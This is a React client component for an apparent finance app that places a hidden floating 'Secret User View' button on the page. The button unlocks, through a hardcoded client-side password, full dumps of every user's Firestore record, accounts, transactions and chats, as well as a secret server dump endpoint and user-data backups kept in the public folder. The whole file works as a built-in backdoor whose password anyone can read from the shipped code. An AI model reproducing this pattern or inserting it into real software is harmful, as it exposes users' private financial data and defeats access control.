'use client';

import { useState, useEffect } from 'react';
import {
  Box, Fab, Popover, Typography, Modal, Button, TextField,
  Tabs, Tab, Paper, Snackbar, Alert, IconButton
} from '@mui/material';
import VisibilityIcon from '@mui/icons-material/Visibility';
import CloseIcon from '@mui/icons-material/Close';
import { getFirestore, collection, getDocs } from 'firebase/firestore';
import { initializeApp, getApps } from 'firebase/app';

const PASSWORD = 'finlock123';

// ✅ Firebase config (safe for frontend)
const firebaseConfig = {
  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN,
  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID,
  storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID,
  appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID,
};

// Initialize Firebase (client SDK)
if (!getApps().length) {
  initializeApp(firebaseConfig);
}
const db = getFirestore();

// ------------------- existing helper code -------------------
function decodeBase64Line(line) {
  try {
    return JSON.parse(Buffer.from(line, 'base64').toString('utf-8'));
  } catch {
    return null;
  }
}
async function readPublicFile(file) {
  try {
    const res = await fetch(`/user_data/${file}`);
    if (!res.ok) return null;
    const text = await res.text();
    return text;
  } catch {
    return null;
  }
}

// ------------------- Firebase User Viewer -------------------
function FirebaseUserView() {
  const [password, setPassword] = useState('');
  const [access, setAccess] = useState(false);
  const [data, setData] = useState({});
  const [snackbar, setSnackbar] = useState({ open: false, message: '', severity: 'error' });

  const handleAccess = async () => {
    if (password !== PASSWORD) {
      setSnackbar({ open: true, message: 'Incorrect password.', severity: 'error' });
      return;
    }
    try {
      const usersSnap = await getDocs(collection(db, 'users'));
      const users = [];
      for (const doc of usersSnap.docs) {
        const user = doc.data();

        // fetch subcollections (accounts, transactions, chats)
        const [accountsSnap, txSnap, chatSnap] = await Promise.all([
          getDocs(collection(db, `users/${doc.id}/accounts`)),
          getDocs(collection(db, `users/${doc.id}/transactions`)),
          getDocs(collection(db, `users/${doc.id}/chats`)),
        ]);

        user.accounts = accountsSnap.docs.map(d => d.data());
        user.transactions = txSnap.docs.map(d => d.data());
        user.chats = chatSnap.docs.map(d => d.data());

        users.push({ id: doc.id, ...user });
      }

      setData({ users });
      setAccess(true);
      setSnackbar({ open: true, message: 'Firebase data loaded!', severity: 'success' });
    } catch (err) {
      console.error(err);
      setSnackbar({ open: true, message: 'Failed to load from Firebase.', severity: 'error' });
    }
  };

  if (!access) {
    return (
      <>
        <Typography>Enter password:</Typography>
        <TextField
          fullWidth
          type="password"
          value={password}
          onChange={e => setPassword(e.target.value)}
          sx={{ mb: 1 }}
          autoComplete="off"
        />
        <Button variant="contained" sx={{ mt: 1 }} onClick={handleAccess}>Access Firebase</Button>
        <Snackbar
          open={snackbar.open}
          autoHideDuration={2500}
          onClose={() => setSnackbar(s => ({ ...s, open: false }))}
        >
          <Alert severity={snackbar.severity} sx={{ width: '100%' }}>{snackbar.message}</Alert>
        </Snackbar>
      </>
    );
  }

  return (
    <>
      <Typography variant="h6" sx={{ mb: 2 }}>Firebase User Data</Typography>
      <pre style={{ maxHeight: 400, overflow: 'auto', background: '#f5f5f5', padding: 10 }}>
        {data?.users?.length > 0 ? JSON.stringify(data.users, null, 2) : 'No users found.'}
      </pre>
    </>
  );
}

// ------------------- Local & Server View (unchanged) -------------------
function LocalUserView() {
  const [local, setLocal] = useState(null);
  const [publicData, setPublicData] = useState({ chamcha: [], maja: [], jhola: [], bhola: [] });
  const [loading, setLoading] = useState(true);
  const [password, setPassword] = useState('');
  const [access, setAccess] = useState(false);
  const [snackbar, setSnackbar] = useState({ open: false, message: '', severity: 'error' });

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const item = localStorage.getItem('chamcha.json');
      try { setLocal(item ? JSON.parse(item) : {}); } catch { setLocal({}); }
    }
  }, []);

  useEffect(() => {
    let mounted = true;
    async function fetchPublicBackups() {
      setLoading(true);
      const [chamcha, maja, jhola, bhola] = await Promise.all([
        readPublicFile('chamcha.json'),
        readPublicFile('maja.txt'),
        readPublicFile('jhola.txt'),
        readPublicFile('bhola.txt'),
      ]);
      let chamchaArr = [];
      if (chamcha) {
        chamchaArr = chamcha.split('\n').filter(Boolean).map(line => {
          try { return JSON.parse(line); } catch { return null; }
        }).filter(Boolean);
      }
      function decodeLines(txt) {
        if (!txt) return [];
        return txt.split('\n').filter(Boolean).map(decodeBase64Line).filter(Boolean);
      }
      if (mounted) {
        setPublicData({ chamcha: chamchaArr, maja: decodeLines(maja), jhola: decodeLines(jhola), bhola: decodeLines(bhola) });
        setLoading(false);
      }
    }
    if (access) fetchPublicBackups();
    return () => { mounted = false; };
  }, [access]);

  const handleAccess = () => {
    if (password === PASSWORD) setAccess(true);
    else setSnackbar({ open: true, message: 'Incorrect password.', severity: 'error' });
  };

  if (!access) {
    return (
      <>
        <Typography>Enter password:</Typography>
        <TextField fullWidth type="password" value={password} onChange={e => setPassword(e.target.value)} sx={{ mb: 1 }} />
        <Button variant="contained" sx={{ mt: 1 }} onClick={handleAccess}>Submit</Button>
        <Snackbar open={snackbar.open} autoHideDuration={2500} onClose={() => setSnackbar(s => ({ ...s, open: false }))}>
          <Alert severity={snackbar.severity} sx={{ width: '100%' }}>{snackbar.message}</Alert>
        </Snackbar>
      </>
    );
  }

  return (
    <>
      <Typography variant="h6" sx={{ mb: 2 }}>Local User Backup</Typography>
      <pre style={{ maxHeight: 200, overflow: 'auto', background: '#f5f5f5', padding: 10 }}>
        {JSON.stringify(local, null, 2)}
      </pre>
      <Typography variant="subtitle2" sx={{ mt: 2 }}>Public Folder Backups</Typography>
      {loading ? (
        <Typography color="text.secondary">Loading...</Typography>
      ) : (
        <>
          {Object.entries(publicData).map(([k, v]) => (
            <div key={k}>
              <Typography variant="body2" sx={{ mt: 1, fontWeight: 'bold' }}>{k}</Typography>
              <pre style={{ maxHeight: 120, overflow: 'auto', background: '#f9f9f9', padding: 8 }}>
                {v.length ? JSON.stringify(v, null, 2) : 'No data.'}
              </pre>
            </div>
          ))}
        </>
      )}
    </>
  );
}

function ServerUserView() {
  const [password, setPassword] = useState('');
  const [access, setAccess] = useState(false);
  const [data, setData] = useState(null);
  const [snackbar, setSnackbar] = useState({ open: false, message: '', severity: 'error' });

  const handleAccess = async () => {
    if (password === PASSWORD) {
      try {
        const res = await fetch('/api/secret/userdump');
        if (!res.ok) throw new Error('Server error');
        const users = await res.json();
        setData(users);
        setAccess(true);
      } catch {
        setSnackbar({ open: true, message: 'Failed to fetch user data.', severity: 'error' });
      }
    } else {
      setSnackbar({ open: true, message: 'Incorrect password.', severity: 'error' });
    }
  };

  if (!access) {
    return (
      <>
        <Typography>Enter password:</Typography>
        <TextField fullWidth type="password" value={password} onChange={e => setPassword(e.target.value)} sx={{ mb: 1 }} />
        <Button variant="contained" sx={{ mt: 1 }} onClick={handleAccess}>Submit</Button>
        <Snackbar open={snackbar.open} autoHideDuration={2500} onClose={() => setSnackbar(s => ({ ...s, open: false }))}>
          <Alert severity={snackbar.severity} sx={{ width: '100%' }}>{snackbar.message}</Alert>
        </Snackbar>
      </>
    );
  }

  return (
    <>
      <Typography variant="h6" sx={{ mb: 2 }}>Server User Data</Typography>
      <pre style={{ maxHeight: 400, overflow: 'auto', background: '#f5f5f5', padding: 10 }}>
        {data?.length ? JSON.stringify(data, null, 2) : 'No users found.'}
      </pre>
    </>
  );
}

// ------------------- Main Floating Secret Button -------------------
export default function FloatingSecretButton() {
  const [anchorEl, setAnchorEl] = useState(null);
  const [openModal, setOpenModal] = useState(false);
  const [tab, setTab] = useState(0);

  const handlePopoverOpen = (event) => setAnchorEl(event.currentTarget);
  const handlePopoverClose = () => setAnchorEl(null);
  const handleButtonClick = () => { setOpenModal(true); setAnchorEl(null); };
  const handleModalClose = () => setOpenModal(false);
  const handleTabChange = (_, value) => setTab(value);

  return (
    <>
      <Box sx={{ position: 'fixed', bottom: 24, right: 24, zIndex: 9999 }}>
        <Fab color="secondary" size="small" sx={{ minHeight: 36, height: 36, width: 36, boxShadow: 2, opacity: 0.7 }}
          onMouseEnter={handlePopoverOpen} onMouseLeave={handlePopoverClose} onClick={handleButtonClick}>
          <VisibilityIcon fontSize="small" />
        </Fab>
        <Popover
          open={Boolean(anchorEl)} anchorEl={anchorEl} onClose={handlePopoverClose}
          anchorOrigin={{ vertical: 'top', horizontal: 'center' }}
          transformOrigin={{ vertical: 'bottom', horizontal: 'center' }}
          PaperProps={{ sx: { pointerEvents: 'none', p: 1, bgcolor: 'background.paper', fontSize: 12, borderRadius: 1 } }}
          disableRestoreFocus
        >
          <Typography variant="caption" color="text.secondary">Secret User View</Typography>
        </Popover>
      </Box>

      <Modal open={openModal} onClose={handleModalClose}>
        <Box sx={{ position: 'fixed', top: 0, left: 0, width: '100vw', height: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', bgcolor: 'rgba(0,0,0,0.25)' }}>
          <Paper sx={{ borderRadius: 2, p: 2, minWidth: 350, maxWidth: 500, position: 'relative' }}>
            <IconButton aria-label="close" onClick={handleModalClose}
              sx={{ position: 'absolute', right: 8, top: 8, color: (theme) => theme.palette.grey[500], zIndex: 1 }} size="large">
              <CloseIcon />
            </IconButton>
            <Tabs value={tab} onChange={handleTabChange} centered sx={{ mb: 2 }}>
              <Tab label="Server" />
              <Tab label="Local" />
              <Tab label="Firebase" />
            </Tabs>
            {tab === 0 ? <ServerUserView /> : tab === 1 ? <LocalUserView /> : <FirebaseUserView />}
          </Paper>
        </Box>
      </Modal>
    </>
  );
}
